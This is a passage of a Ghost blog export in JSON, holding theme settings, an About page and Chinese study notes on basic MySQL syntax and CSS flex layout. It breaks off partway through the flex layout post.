{
    "db": [
        {
            "meta": {
                "exported_on": 1669088578486,
                "version": "5.22.10"
            },
            "data": {
                "benefits": [],
                "custom_theme_settings": [
                    {
                        "id": "634c09d4b2ffd27df36d58b6",
                        "theme": "casper",
                        "key": "title_font",
                        "type": "select",
                        "value": "Modern sans-serif"
                    },
                    {
                        "id": "634c09d4b2ffd27df36d58b7",
                        "theme": "casper",
                        "key": "body_font",
                        "type": "select",
                        "value": "Elegant serif"
                    },
                    {
                        "id": "634c09d4b2ffd27df36d58b8",
                        "theme": "casper",
                        "key": "show_publication_cover",
                        "type": "boolean",
                        "value": "true"
                    },
                    {
                        "id": "634c09d4b2ffd27df36d58b9",
                        "theme": "casper",
                        "key": "header_style",
                        "type": "select",
                        "value": "Center aligned"
                    },
                    {
                        "id": "634c09d4b2ffd27df36d58bb",
                        "theme": "casper",
                        "key": "feed_layout",
                        "type": "select",
                        "value": "Classic"
                    },
                    {
                        "id": "634c09d4b2ffd27df36d58bc",
                        "theme": "casper",
                        "key": "color_scheme",
                        "type": "select",
                        "value": "Auto"
                    },
                    {
                        "id": "634c09d4b2ffd27df36d58bd",
                        "theme": "casper",
                        "key": "post_image_style",
                        "type": "select",
                        "value": "Wide"
                    },
                    {
                        "id": "634c09d4b2ffd27df36d58be",
                        "theme": "casper",
                        "key": "email_signup_text",
                        "type": "text",
                        "value": "Sign up for more like this."
                    },
                    {
                        "id": "634c09d4b2ffd27df36d58bf",
                        "theme": "casper",
                        "key": "show_recent_posts_footer",
                        "type": "boolean",
                        "value": "true"
                    },
                    {
                        "id": "6371e0633d88f46264b10f3a",
                        "theme": "casper",
                        "key": "navigation_layout",
                        "type": "select",
                        "value": "Logo on cover"
                    },
                    {
                        "id": "637258753d88f46264b10fde",
                        "theme": "ruby",
                        "key": "navigation_layout",
                        "type": "select",
                        "value": "Logo in the middle"
                    },
                    {
                        "id": "637258753d88f46264b10fdf",
                        "theme": "ruby",
                        "key": "title_font",
                        "type": "select",
                        "value": "Modern sans-serif"
                    },
                    {
                        "id": "637258753d88f46264b10fe0",
                        "theme": "ruby",
                        "key": "body_font",
                        "type": "select",
                        "value": "Modern sans-serif"
                    },
                    {
                        "id": "637258753d88f46264b10fe1",
                        "theme": "ruby",
                        "key": "show_related_posts",
                        "type": "boolean",
                        "value": "true"
                    }
                ],
                "newsletters": [
                    {
                        "id": "634c09cfb2ffd27df36d56cf",
                        "uuid": "46bd9a8a-dbae-4bf2-955f-3ea45c264539",
                        "name": "lord",
                        "description": null,
                        "feedback_enabled": 0,
                        "slug": "default-newsletter",
                        "sender_name": null,
                        "sender_email": null,
                        "sender_reply_to": "newsletter",
                        "status": "active",
                        "visibility": "members",
                        "subscribe_on_signup": 1,
                        "sort_order": 0,
                        "header_image": null,
                        "show_header_icon": 1,
                        "show_header_title": 1,
                        "title_font_category": "sans_serif",
                        "title_alignment": "center",
                        "show_feature_image": 1,
                        "body_font_category": "sans_serif",
                        "footer_content": null,
                        "show_badge": 1,
                        "show_header_name": 0,
                        "created_at": "2022-10-16T13:40:31.000Z",
                        "updated_at": "2022-11-14T11:14:10.000Z"
                    }
                ],
                "offer_redemptions": [],
                "offers": [],
                "posts": [
                    {
                        "id": "634c09d0b2ffd27df36d573b",
                        "uuid": "a1399b21-42bf-43df-bf04-7f301f602635",
                        "title": "Hello",
                        "slug": "coming-soon",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[[\"a\",[\"href\",\"#/portal/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"This is hide cats everyday, a brand new site by peekaboo that's just getting started. Things will be up and running here shortly, but you can \"],[0,[0],1,\"subscribe\"],[0,[],0,\" in the meantime if you'd like to stay up to date and receive emails when new content is published!\"]]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<p>This is hide cats everyday, a brand new site by peekaboo that's just getting started. Things will be up and running here shortly, but you can <a href=\"#/portal/\">subscribe</a> in the meantime if you'd like to stay up to date and receive emails when new content is published!</p>",
                        "comment_id": "634c09d0b2ffd27df36d573b",
                        "plaintext": "This is hide cats everyday, a brand new site by peekaboo that's just getting started. Things will be up and running here shortly, but you can subscribe in the meantime if you'd like to stay up to date and receive emails when new content is published!",
                        "feature_image": "https://static.ghost.org/v4.0.0/images/feature-image.jpg",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-10-16T13:40:32.000Z",
                        "updated_at": "2022-11-14T10:38:35.000Z",
                        "published_at": "2022-10-16T13:40:32.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "634c09d1b2ffd27df36d573d",
                        "uuid": "dfa51bb2-b619-4b3b-99fe-e70532975a82",
                        "title": "About this Ghost",
                        "slug": "about",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[[\"strong\"]],\"sections\":[[1,\"p\",[]],[1,\"p\",[]],[1,\"p\",[[0,[],0,\"My name is changjing, and nice to meet u in here.\"]]],[1,\"p\",[]],[1,\"h5\",[[0,[],0,\"Contact me\"]]],[1,\"p\",[[0,[],0,\"peakednessvip@163.com\"]]],[1,\"p\",[]],[1,\"p\",[[0,[0,0],2,\"Things I know a little bit\"]]],[3,\"ul\",[[[0,[],0,\"Web development：JavaScript、Vue.js  and many style libraries\"]],[[0,[],0,\"Backstage：JavaSE、MySQL、SpringBoot、Redis\"]],[[0,[],0,\"Python、Web safety and php (still working on it)\"]]]],[1,\"p\",[]],[1,\"h4\",[[0,[],0,\"at last\"]]],[1,\"p\",[[0,[],0,\"I have learned a lot, but from now on I will record them!\"]]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<p></p><p></p><p>My name is changjing, and nice to meet u in here.</p><p></p><h5 id=\"contact-me\">Contact me</h5><p>peakednessvip@163.com</p><p></p><p><strong><strong>Things I know a little bit</strong></strong></p><ul><li>Web development：JavaScript、Vue.js  and many style libraries</li><li>Backstage：JavaSE、MySQL、SpringBoot、Redis</li><li>Python、Web safety and php (still working on it)</li></ul><p></p><h4 id=\"at-last\">at last</h4><p>I have learned a lot, but from now on I will record them!</p>",
                        "comment_id": "634c09d1b2ffd27df36d573d",
                        "plaintext": "My name is changjing, and nice to meet u in here.\n\n\n\nContact me\n\npeakednessvip@163.com\n\n\n\nThings I know a little bit\n\n * Web development：JavaScript、Vue.js  and many style libraries\n * Backstage：JavaSE、MySQL、SpringBoot、Redis\n * Python、Web safety and php (still working on it)\n\n\n\nat last\n\nI have learned a lot, but from now on I will record them!",
                        "feature_image": null,
                        "featured": 0,
                        "type": "page",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-10-16T13:40:33.000Z",
                        "updated_at": "2022-11-20T15:07:21.000Z",
                        "published_at": "2022-10-16T13:40:33.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "6371e3843d88f46264b10f43",
                        "uuid": "b3d216ab-5791-4a87-920c-86d1ea5d58f5",
                        "title": "Mysql基础",
                        "slug": "mysqlji-chu",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"create database | schema [if not exists] databaseName;\\n\\n-- 如果数据库不存在，则创建该数据库\\ncreate database if not exists databaseName;\\n\\n-- 创建数据库时，指定默认数据库字符集和字符集校对规则\\ncreate database [if not exists] databaseName\\n[default] character set [=] 字符集\\n[default] collate [=] 校队规则\\n\\n-- 选择数据库\\nuse database;\\n\\n-- 查看所有数据库\\nshow databases;\\n\\n-- 修该数据库名\\nalter database databaseName;\\n\\n-- 删除数据库\\ndrop database databaseName;\\n\\n-- 查看数据库默认存储引擎\\nshow variables like 'storage_engin%';\\n\\n-- 查看MySQL所支持的存储引擎和默认存储引擎\\nshow engine;\\n\\n\",\"language\":\"sql\"}],[\"code\",{\"code\":\"-- 创建表操作并设置默认引擎\\ncreate table tableName(\\n\\t字段名1 数据类型,\\n\\t字段名2 数据类型\\n)engine=引擎类型;\\n\\n-- 查看当前数据库中表所有表名称\\nshow tables;\\n\\n-- 查看非当前数据库中所有表名称\\nshow tables from | in databaseName;\\n\\n-- 查看数据表的详细结构\\nshow create table tableName;\\n\\n-- 删除当前指定数据中的表\\ndrop table tableName;\\n\\n\",\"language\":\"sql\"}],[\"code\",{\"code\":\"-- 修改表名称\\nalter table oldTableName rename [to] newTableName;\\n\\n-- 增加表字段\\nalter table tableName add lineName dataType;\\n\\n-- 增加字段并放置最前\\nalter table tableName add lineName dataType first;\\n\\n-- 增加字段并放置在指定列名后\\nalter table tableName add lineName dataType after lineName;\\n\\n-- 删除表中的字段\\nalter table tableName drop lineName;\\n\\n-- 修改表中的数据类型\\nalter table tableName modify lineName dataType [ first | after lineName ];\\n\\n-- 修改表中的列名\\nalter table tableName change oldLineName newLineName oldDataType | newDataType ;\\n\\n-- 修改表的存储引擎和字符集\\nalter table tableName engine = 存储引擎,charset = 字符集;\\n\\n-- 添加列\\nalter table tableName add column lineName dataType;\\n\\n-- 删除列\\nalter table tableName drop column lineName;\\n\\n\\n\",\"language\":\"sql\"}],[\"code\",{\"code\":\"-- 列级完整性约束方式定义主键 在某个字段后加关键字primary key\\ncreate table test(\\n\\tid int primary key\\n);\\n\\n-- 表级完整性约束方式定义主键 适合定义多列所构成的主键。\\nconstraint 约束名字 PRIMARY KEY(列名1,..,列名n)\\ncreate table test(\\n\\tid int,\\n\\tconstraint test_key primary key(id,[lineName])\\n);\\n\\n-- 添加主键约束方式\\nalter table tableName add[constraint 约束名字] primary key(lineName1,..,LinaNameN);\\n\\n-- 删除主键约束  无论主键约束有没有名称都可使用\\nalter table tableName drop primary key;\\n\\n-- 添加候选键约束\\nalter table tableName add [constraint 约束名字] unique (lineName1,..,LinaNameN);\\n\\n-- 删除候选键约束\\nalter table tableName drop index 约束名|候选键字段名;\\n\\n-- 修改表字段设置默认值\\nalter table tableName  alter lineName set default 默认值;\\n\\n-- 修改表新增字段且为该字段设置默认值\\nalter table tableName add lineName dataType default 默认值;\\n\\n-- 修改表已有的字段增加自增约束\\nalter table tableName modify lineName dataType auto_increment primary key;\\n\\n-- 修改表新增字段并同时增加自增约束\\nalter table tableName add lineName dataType primary key auto_increment;\\n\\n-- 删除表的自增主键约束\\n-- 1.修改该字段的数据类型方法，去除自增约束属性\\nalter table tableName modify lineName dataType; \\n-- 2.删除该字段的主键约束\\nalter table tableName drop primary key;\\n\\n-- 创建表的同时，创建外键约束\\nconstraint 外键约束名字 foreign key (lineName1,..,LinaNameN) references 被参照表(lineName1,..,LinaNameN);\\n\\n-- 添加表约束\\nalter table 参照表 add constraint 外键约束名 foreign key(参照表外键字段1,..字段名n) references 被参照表表名(被参照表字段名1,...字段名n);\\n\\n-- 删除表外键约束\\nalter table 参照表 drop foreign key 外键约束名;\\n\\n\\n\",\"language\":\"sql\"}],[\"code\",{\"code\":\"-- 已经存在的表上创建普通索引\\ncreate index indexName on tableName(lineName);\\n-- 或\\nalter table tableName add index [indexName] (lineName);\\n\\n-- 查看所创建的索引\\nshow index from tableName;\\n\\n-- 在已经存在的表上使用create创建唯一索引\\ncreate unique index indexName on tableName(lineName);\\n-- 或\\nalter table tableName add unique index [indexName] \\t(lineName);\\n\\n-- 通过create在已经存在的表上创建全文索引  (存储引擎为MySAM)\\ncreate fulltext index indexName on tableName(lineName);\\n-- 或\\nalter table tableName add fulltext index [indexName] (lineName);\\n\\n-- 删除索引\\ndrop index indexName on tableName;\\n\\n-- 同时删除多个索引\\nalter table tableName drop index; \\n\\n\\n\",\"language\":\"sql\"}],[\"code\",{\"code\":\"-- 插入完整数据\\ninsert into tableName (lineName1,..,LinaNameN) values (values1,..,valuesN);\\n\\n-- 插入多条完整数据\\ninsert into tableName (lineName1,..,LinaNameN) values (values1,..,valuesN),(values1,..,valuesN),(valuesN,..,valuesN);\\n\\n-- 插入查询结果\\ninsert into tableName (lineName1,..,LinaNameN) select (lineName1,..,LinaNameN) from tableName;\\n\\n-- 更新特定数据\\nupdate tableName set lineName = value where 条件;\\n\\n-- 删除特定数据\\ndelete from tableName where 条件;\\n\\n-- 删除所有数据\\ndelete from tableName;\\n\\n\",\"language\":\"c++\"}]],\"markups\":[],\"sections\":[[1,\"h2\",[[0,[],0,\"1、简介\"]]],[1,\"h2\",[[0,[],0,\"2、数据库和表的操作\"]]],[1,\"h5\",[[0,[],0,\"2.1：数据库操作\"]]],[10,0],[1,\"h5\",[[0,[],0,\"2.2：表创建与查看操作\"]]],[10,1],[1,\"h5\",[[0,[],0,\"2.3：表修改操作\"]]],[10,2],[1,\"h5\",[[0,[],0,\"2.4：表的约束\"]]],[10,3],[1,\"h5\",[[0,[],0,\"2.5：索引操作\"]]],[10,4],[1,\"h5\",[[0,[],0,\"2.6：数据操作\"]]],[10,5]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h2 id=\"1%E3%80%81%E7%AE%80%E4%BB%8B\">1、简介</h2><h2 id=\"2%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E8%A1%A8%E7%9A%84%E6%93%8D%E4%BD%9C\">2、数据库和表的操作</h2><h5 id=\"21%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C\">2.1：数据库操作</h5><pre><code class=\"language-sql\">create database | schema [if not exists] databaseName;\n\n-- 如果数据库不存在，则创建该数据库\ncreate database if not exists databaseName;\n\n-- 创建数据库时，指定默认数据库字符集和字符集校对规则\ncreate database [if not exists] databaseName\n[default] character set [=] 字符集\n[default] collate [=] 校队规则\n\n-- 选择数据库\nuse database;\n\n-- 查看所有数据库\nshow databases;\n\n-- 修该数据库名\nalter database databaseName;\n\n-- 删除数据库\ndrop database databaseName;\n\n-- 查看数据库默认存储引擎\nshow variables like 'storage_engin%';\n\n-- 查看MySQL所支持的存储引擎和默认存储引擎\nshow engine;\n\n</code></pre><h5 id=\"22%EF%BC%9A%E8%A1%A8%E5%88%9B%E5%BB%BA%E4%B8%8E%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C\">2.2：表创建与查看操作</h5><pre><code class=\"language-sql\">-- 创建表操作并设置默认引擎\ncreate table tableName(\n\t字段名1 数据类型,\n\t字段名2 数据类型\n)engine=引擎类型;\n\n-- 查看当前数据库中表所有表名称\nshow tables;\n\n-- 查看非当前数据库中所有表名称\nshow tables from | in databaseName;\n\n-- 查看数据表的详细结构\nshow create table tableName;\n\n-- 删除当前指定数据中的表\ndrop table tableName;\n\n</code></pre><h5 id=\"23%EF%BC%9A%E8%A1%A8%E4%BF%AE%E6%94%B9%E6%93%8D%E4%BD%9C\">2.3：表修改操作</h5><pre><code class=\"language-sql\">-- 修改表名称\nalter table oldTableName rename [to] newTableName;\n\n-- 增加表字段\nalter table tableName add lineName dataType;\n\n-- 增加字段并放置最前\nalter table tableName add lineName dataType first;\n\n-- 增加字段并放置在指定列名后\nalter table tableName add lineName dataType after lineName;\n\n-- 删除表中的字段\nalter table tableName drop lineName;\n\n-- 修改表中的数据类型\nalter table tableName modify lineName dataType [ first | after lineName ];\n\n-- 修改表中的列名\nalter table tableName change oldLineName newLineName oldDataType | newDataType ;\n\n-- 修改表的存储引擎和字符集\nalter table tableName engine = 存储引擎,charset = 字符集;\n\n-- 添加列\nalter table tableName add column lineName dataType;\n\n-- 删除列\nalter table tableName drop column lineName;\n\n\n</code></pre><h5 id=\"24%EF%BC%9A%E8%A1%A8%E7%9A%84%E7%BA%A6%E6%9D%9F\">2.4：表的约束</h5><pre><code class=\"language-sql\">-- 列级完整性约束方式定义主键 在某个字段后加关键字primary key\ncreate table test(\n\tid int primary key\n);\n\n-- 表级完整性约束方式定义主键 适合定义多列所构成的主键。\nconstraint 约束名字 PRIMARY KEY(列名1,..,列名n)\ncreate table test(\n\tid int,\n\tconstraint test_key primary key(id,[lineName])\n);\n\n-- 添加主键约束方式\nalter table tableName add[constraint 约束名字] primary key(lineName1,..,LinaNameN);\n\n-- 删除主键约束  无论主键约束有没有名称都可使用\nalter table tableName drop primary key;\n\n-- 添加候选键约束\nalter table tableName add [constraint 约束名字] unique (lineName1,..,LinaNameN);\n\n-- 删除候选键约束\nalter table tableName drop index 约束名|候选键字段名;\n\n-- 修改表字段设置默认值\nalter table tableName  alter lineName set default 默认值;\n\n-- 修改表新增字段且为该字段设置默认值\nalter table tableName add lineName dataType default 默认值;\n\n-- 修改表已有的字段增加自增约束\nalter table tableName modify lineName dataType auto_increment primary key;\n\n-- 修改表新增字段并同时增加自增约束\nalter table tableName add lineName dataType primary key auto_increment;\n\n-- 删除表的自增主键约束\n-- 1.修改该字段的数据类型方法，去除自增约束属性\nalter table tableName modify lineName dataType; \n-- 2.删除该字段的主键约束\nalter table tableName drop primary key;\n\n-- 创建表的同时，创建外键约束\nconstraint 外键约束名字 foreign key (lineName1,..,LinaNameN) references 被参照表(lineName1,..,LinaNameN);\n\n-- 添加表约束\nalter table 参照表 add constraint 外键约束名 foreign key(参照表外键字段1,..字段名n) references 被参照表表名(被参照表字段名1,...字段名n);\n\n-- 删除表外键约束\nalter table 参照表 drop foreign key 外键约束名;\n\n\n</code></pre><h5 id=\"25%EF%BC%9A%E7%B4%A2%E5%BC%95%E6%93%8D%E4%BD%9C\">2.5：索引操作</h5><pre><code class=\"language-sql\">-- 已经存在的表上创建普通索引\ncreate index indexName on tableName(lineName);\n-- 或\nalter table tableName add index [indexName] (lineName);\n\n-- 查看所创建的索引\nshow index from tableName;\n\n-- 在已经存在的表上使用create创建唯一索引\ncreate unique index indexName on tableName(lineName);\n-- 或\nalter table tableName add unique index [indexName] \t(lineName);\n\n-- 通过create在已经存在的表上创建全文索引  (存储引擎为MySAM)\ncreate fulltext index indexName on tableName(lineName);\n-- 或\nalter table tableName add fulltext index [indexName] (lineName);\n\n-- 删除索引\ndrop index indexName on tableName;\n\n-- 同时删除多个索引\nalter table tableName drop index; \n\n\n</code></pre><h5 id=\"26%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C\">2.6：数据操作</h5><pre><code class=\"language-c++\">-- 插入完整数据\ninsert into tableName (lineName1,..,LinaNameN) values (values1,..,valuesN);\n\n-- 插入多条完整数据\ninsert into tableName (lineName1,..,LinaNameN) values (values1,..,valuesN),(values1,..,valuesN),(valuesN,..,valuesN);\n\n-- 插入查询结果\ninsert into tableName (lineName1,..,LinaNameN) select (lineName1,..,LinaNameN) from tableName;\n\n-- 更新特定数据\nupdate tableName set lineName = value where 条件;\n\n-- 删除特定数据\ndelete from tableName where 条件;\n\n-- 删除所有数据\ndelete from tableName;\n\n</code></pre>",
                        "comment_id": "6371e3843d88f46264b10f43",
                        "plaintext": "1、简介\n\n\n2、数据库和表的操作\n\n2.1：数据库操作\n\ncreate database | schema [if not exists] databaseName;\n\n-- 如果数据库不存在，则创建该数据库\ncreate database if not exists databaseName;\n\n-- 创建数据库时，指定默认数据库字符集和字符集校对规则\ncreate database [if not exists] databaseName\n[default] character set [=] 字符集\n[default] collate [=] 校队规则\n\n-- 选择数据库\nuse database;\n\n-- 查看所有数据库\nshow databases;\n\n-- 修该数据库名\nalter database databaseName;\n\n-- 删除数据库\ndrop database databaseName;\n\n-- 查看数据库默认存储引擎\nshow variables like 'storage_engin%';\n\n-- 查看MySQL所支持的存储引擎和默认存储引擎\nshow engine;\n\n\n\n2.2：表创建与查看操作\n\n-- 创建表操作并设置默认引擎\ncreate table tableName(\n\t字段名1 数据类型,\n\t字段名2 数据类型\n)engine=引擎类型;\n\n-- 查看当前数据库中表所有表名称\nshow tables;\n\n-- 查看非当前数据库中所有表名称\nshow tables from | in databaseName;\n\n-- 查看数据表的详细结构\nshow create table tableName;\n\n-- 删除当前指定数据中的表\ndrop table tableName;\n\n\n\n2.3：表修改操作\n\n-- 修改表名称\nalter table oldTableName rename [to] newTableName;\n\n-- 增加表字段\nalter table tableName add lineName dataType;\n\n-- 增加字段并放置最前\nalter table tableName add lineName dataType first;\n\n-- 增加字段并放置在指定列名后\nalter table tableName add lineName dataType after lineName;\n\n-- 删除表中的字段\nalter table tableName drop lineName;\n\n-- 修改表中的数据类型\nalter table tableName modify lineName dataType [ first | after lineName ];\n\n-- 修改表中的列名\nalter table tableName change oldLineName newLineName oldDataType | newDataType ;\n\n-- 修改表的存储引擎和字符集\nalter table tableName engine = 存储引擎,charset = 字符集;\n\n-- 添加列\nalter table tableName add column lineName dataType;\n\n-- 删除列\nalter table tableName drop column lineName;\n\n\n\n\n2.4：表的约束\n\n-- 列级完整性约束方式定义主键 在某个字段后加关键字primary key\ncreate table test(\n\tid int primary key\n);\n\n-- 表级完整性约束方式定义主键 适合定义多列所构成的主键。\nconstraint 约束名字 PRIMARY KEY(列名1,..,列名n)\ncreate table test(\n\tid int,\n\tconstraint test_key primary key(id,[lineName])\n);\n\n-- 添加主键约束方式\nalter table tableName add[constraint 约束名字] primary key(lineName1,..,LinaNameN);\n\n-- 删除主键约束  无论主键约束有没有名称都可使用\nalter table tableName drop primary key;\n\n-- 添加候选键约束\nalter table tableName add [constraint 约束名字] unique (lineName1,..,LinaNameN);\n\n-- 删除候选键约束\nalter table tableName drop index 约束名|候选键字段名;\n\n-- 修改表字段设置默认值\nalter table tableName  alter lineName set default 默认值;\n\n-- 修改表新增字段且为该字段设置默认值\nalter table tableName add lineName dataType default 默认值;\n\n-- 修改表已有的字段增加自增约束\nalter table tableName modify lineName dataType auto_increment primary key;\n\n-- 修改表新增字段并同时增加自增约束\nalter table tableName add lineName dataType primary key auto_increment;\n\n-- 删除表的自增主键约束\n-- 1.修改该字段的数据类型方法，去除自增约束属性\nalter table tableName modify lineName dataType; \n-- 2.删除该字段的主键约束\nalter table tableName drop primary key;\n\n-- 创建表的同时，创建外键约束\nconstraint 外键约束名字 foreign key (lineName1,..,LinaNameN) references 被参照表(lineName1,..,LinaNameN);\n\n-- 添加表约束\nalter table 参照表 add constraint 外键约束名 foreign key(参照表外键字段1,..字段名n) references 被参照表表名(被参照表字段名1,...字段名n);\n\n-- 删除表外键约束\nalter table 参照表 drop foreign key 外键约束名;\n\n\n\n\n2.5：索引操作\n\n-- 已经存在的表上创建普通索引\ncreate index indexName on tableName(lineName);\n-- 或\nalter table tableName add index [indexName] (lineName);\n\n-- 查看所创建的索引\nshow index from tableName;\n\n-- 在已经存在的表上使用create创建唯一索引\ncreate unique index indexName on tableName(lineName);\n-- 或\nalter table tableName add unique index [indexName] \t(lineName);\n\n-- 通过create在已经存在的表上创建全文索引  (存储引擎为MySAM)\ncreate fulltext index indexName on tableName(lineName);\n-- 或\nalter table tableName add fulltext index [indexName] (lineName);\n\n-- 删除索引\ndrop index indexName on tableName;\n\n-- 同时删除多个索引\nalter table tableName drop index; \n\n\n\n\n2.6：数据操作\n\n-- 插入完整数据\ninsert into tableName (lineName1,..,LinaNameN) values (values1,..,valuesN);\n\n-- 插入多条完整数据\ninsert into tableName (lineName1,..,LinaNameN) values (values1,..,valuesN),(values1,..,valuesN),(valuesN,..,valuesN);\n\n-- 插入查询结果\ninsert into tableName (lineName1,..,LinaNameN) select (lineName1,..,LinaNameN) from tableName;\n\n-- 更新特定数据\nupdate tableName set lineName = value where 条件;\n\n-- 删除特定数据\ndelete from tableName where 条件;\n\n-- 删除所有数据\ndelete from tableName;\n\n",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/16c040557d63654c26a36244cc44a856.jpg",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-14T06:43:16.000Z",
                        "updated_at": "2022-11-14T10:39:27.000Z",
                        "published_at": "2022-11-14T06:44:02.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "637217cc3d88f46264b10f65",
                        "uuid": "4434638b-f5d4-4eb3-abac-a90424093b69",
                        "title": "flex布局",
                        "slug": "flexbu-ju",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}]],\"cards\":[[\"hr\",{}]],\"markups\":[[\"strong\"]],\"sections\":[[10,0],[1,\"h2\",[[0,[],0,\"flex布局\"]]],[3,\"ul\",[[[0,[],0,\"操作方便，布局及其简单，移动端应用比较广泛\"]],[[0,[],0,\"IE11或者更低版本不支持flex或者仅支持部分\"]]]],[1,\"h2\",[[0,[],0,\"flex布局原理\"]]],[3,\"ul\",[[[0,[],0,\"flex 是 flexible Box 的缩写，意为\\\"弹性布局\\\"，用来为盒状模型提供最大的灵活性，任何一个容器都可以指定为 flex 布局。\"]],[[0,[],0,\"当我们为父盒子设为 flex 布局以后，子元素的 float、clear 和 vertical-align 属性将失效。\"]],[[0,[],0,\"flex布局又叫伸缩布局 、弹性布局 、伸缩盒布局 、弹性盒布局\"]],[[0,[],0,\"采用 Flex 布局的元素，称为 Flex 容器（flexcontainer），简称\\\"容器\\\"。\"]],[[0,[],0,\"它的所有子元素自动成为容器成员，称为 Flex 项目（flexitem），简称\\\"项目\\\"。\"]]]],[1,\"p\",[[0,[0],1,\"总结\"],[0,[],0,\"：就是通过给父盒子添加flex属性，来控制子盒子的位置和排列方式\"]]],[1,\"h2\",[[0,[],0,\"父项常见属性\"]]],[3,\"ul\",[[[0,[0],1,\"flex-direction：\\t\\t\\t\\t设置主轴的方向\"]],[[0,[0],1,\"justify-content：\\t\\t\\t  设置主轴上的子元素排列方式\"]],[[0,[0],1,\"flex-wrap：\\t\\t\\t\\t\\t\\t设置子元素是否换行\"]],[[0,[0],1,\"align-content：\\t\\t\\t\\t设置侧轴上的子元素的排列方式（多行）\"]],[[0,[0],1,\"align-items：\\t\\t\\t\\t\\t设置侧轴上的子元素排列方式（单行）\"]],[[0,[0],1,\"flex-flow：\\t\\t\\t\\t\\t \\t复合属性，相当于同时设置了 flex-direction 和 flex-wrap\"]]]],[1,\"h3\",[[0,[],0,\"flex-direction\"]]],[3,\"ul\",[[[0,[0],1,\"设置主轴放向\"]],[[0,[],0,\"row\\t\\t\\t\\t\\t\\t\\t默认值从左到右\"]],[[0,[],0,\"row-reverse \\t\\t\\t\\t\\t\\t\\t从右到左\"]],[[0,[],0,\"column \\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t从上到下\"]],[[0,[],0,\"column-reverse \\t\\t\\t\\t 从下到上\"]]]],[1,\"h3\",[[0,[],0,\"justify-content\"]]],[3,\"ul\",[[[0,[0],1,\"设置主轴上子元素排列方式\"]],[[0,[],0,\"flex-start\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t默认值从头部开始\"]],[[0,[],0,\"flex-end\\t\\t\\t\\t\\t\\t\\t\\t\\t \\t从尾部开始排列\"]],[[0,[],0,\"center\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t在主轴居中对齐\"]],[[0,[],0,\"space-around\\t\\t\\t\\t\\t  平分剩余空间\"]],[[0,[],0,\"space-between\\t\\t\\t\\t先俩边贴边在平分剩余空间\"]]]],[1,\"h3\",[[0,[],0,\"flex-wrap\"]]],[3,\"ul\",[[[0,[0],1,\"设置是否换行\"]],[[0,[],0,\"nowrap \\t\\t\\t\\t\\t默认不换行\"]],[[0,[],0,\"wrap\\t\\t\\t\\t\\t\\t\\t换行\"]]]],[1,\"h3\",[[0,[],0,\"align-items\"]]],[3,\"ul\",[[[0,[0],1,\"设置侧轴上的子元素排列方式（单行情况）\"]],[[0,[],0,\"flex-start\\t\\t\\t\\t\\t从头部开始\"]],[[0,[],0,\"flex-end\\t\\t\\t\\t\\t 从尾部开始\"]],[[0,[],0,\"center\\t\\t\\t\\t\\t\\t\\t居中显示\"]],[[0,[],0,\"stretch\\t\\t\\t\\t\\t   拉伸\"]]]],[1,\"h3\",[[0,[],0,\"align-content\"]]],[3,\"ul\",[[[0,[0],1,\"设置侧轴上的子元素排序（多行情况）\"]],[[0,[],0,\"flex-start\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t默认在侧轴的头部开始排列\"]],[[0,[],0,\"flex-end\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t 在侧轴的尾部开始排列\"]],[[0,[],0,\"center\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t在侧轴中间显示\"]],[[0,[],0,\"space-around\\t\\t\\t\\t\\t  子项在侧轴平分剩余空间\"]],[[0,[],0,\"space-between\\t\\t\\t\\t子项在侧轴先分布在两头，在平分剩余空间\"]],[[0,[],0,\"stretch\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t设置子项元素高度平分父元素高度\"]]]],[1,\"h3\",[[0,[],0,\"align-content 和align-items区别\"]]],[3,\"ul\",[[[0,[],0,\"align-items  适用于单行情况下， 只有上对齐、下对齐、居中和 拉伸\"]],[[0,[],0,\"align-content适应于换行（多行）的情况下（单行情况下无效）， 可以设置 上对齐、下对齐、居中、拉伸以及平均分配剩余空间等属性值。\"]],[[0,[],0,\"总结就是单行找align-items  多行找 align-content\"]]]],[1,\"h3\",[[0,[],0,\"复合属性\"]]],[1,\"blockquote\",[[0,[],0,\"flex-flow  ==  flex-direction + 